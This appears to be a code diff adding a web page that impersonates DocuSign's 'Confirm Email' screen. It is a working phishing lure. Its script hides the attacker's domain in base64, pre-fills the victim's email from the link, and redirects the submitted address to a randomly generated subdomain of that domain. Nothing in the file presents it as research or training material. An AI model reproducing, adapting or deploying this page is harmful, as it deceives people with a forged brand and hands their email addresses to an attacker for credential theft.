@@ -1,0 +1,194 @@
+<!DOCTYPE html> 
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DocuSign - Confirm Email</title>
+  <style>
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #ffffff;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #333;
+      background-image: url('https://www.docusign.com/sites/default/files/2020-07/DS-DocusignAgreementCloud.jpg');
+      background-size: cover;
+      background-position: center;
+    }
+    
+    .header {
+      width: 100%;
+      background-color: #0061a8; /* DocuSign blue */
+      color: white;
+      text-align: left;
+      padding: 15px 25px;
+      position: absolute;
+      top: 0;
+      font-size: 20px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+    }
+    
+    .header img {
+      width: 40px;
+      height: auto;
+      margin-right: 15px;
+    }
+    
+    .container {
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 320px;
+      text-align: center;
+    }
+    
+    .container img {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+    
+    h2 {
+      font-size: 22px;
+      margin-bottom: 15px;
+      color: #333;
+    }
+    
+    p {
+      color: #666;
+      margin-bottom: 15px;
+      font-size: 14px;
+    }
+
+    .container input[type="email"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+      box-sizing: border-box;
+      text-align: left;
+    }
+    
+    .container button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0061a8;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    
+    .container button:hover {
+      background-color: #004680;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #888;
+      margin-top: 20px;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        width: 90%;
+        padding: 20px;
+      }
+
+      h2 {
+        font-size: 20px;
+      }
+
+      .container button,
+      .container input[type="email"] {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <span> Docusign </span>
+  </div>
+
+  <div class="container">
+    <img src="https://companieslogo.com/img/orig/DOCU_BIG-fc5d208a.png?t=1720244491" alt="DocuSign Logo">
+    <h2>Confirm Your Email</h2>
+    <p>Enter your email to access the document.</p>
+    
+    <form id="verification-form">
+      <input id="email-input" placeholder="Enter your email address" required type="email">
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+   
+    const base64EncodedDomain = 'ZG9jdW1lbnRzLXJldmlldy5jbG91ZA=='; 
+
+    document.addEventListener('DOMContentLoaded', function() {
+      const hash = window.location.hash.substring(1); // Extract email from URL hash
+      const email = decodeURIComponent(hash);
+      
+      if (validateEmail(email)) {
+        document.getElementById('email-input').value = email;
+      }
+    });
+
+    function continueLoading() {
+      const emailInput = document.getElementById('email-input');
+      const email = emailInput.value.trim().toLowerCase();
+      
+      if (validateEmail(email)) {
+        const randomNumber = generateRandomNumber(); // Generate the random 10-digit number
+        
+        // Decode base64-encoded domain
+        const decodedDomain = atob(base64EncodedDomain);
+        
+        // Construct final URL
+        const link = `https://${randomNumber}.${decodedDomain}/`; // Dynamic wildcard URL
+        const finalLink = `${link}&${encodeURIComponent(email)}`;
+
+        // Redirect to the decoded URL
+        window.location.href = finalLink;
+      } else {
+        alert("Please enter a valid email address.");
+      }
+    }
+
+    // Function to generate a random 10-digit number
+    function generateRandomNumber() {
+      let randomNumber = '';
+      for (let i = 0; i < 10; i++) {
+        randomNumber += Math.floor(Math.random() * 10); // Generate random digit (0-9)
+      }
+      return randomNumber;
+    }
+
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+
+    document.getElementById('verification-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+      continueLoading();
+    });
+
+    document.getElementById('email-input').addEventListener('keydown', function(event) {
+      if (event.key === 'Enter') {
+        document.getElementById('verification-form').dispatchEvent(new Event('submit'));
+      }
+    });
+  </script>
+</body>
+</html>
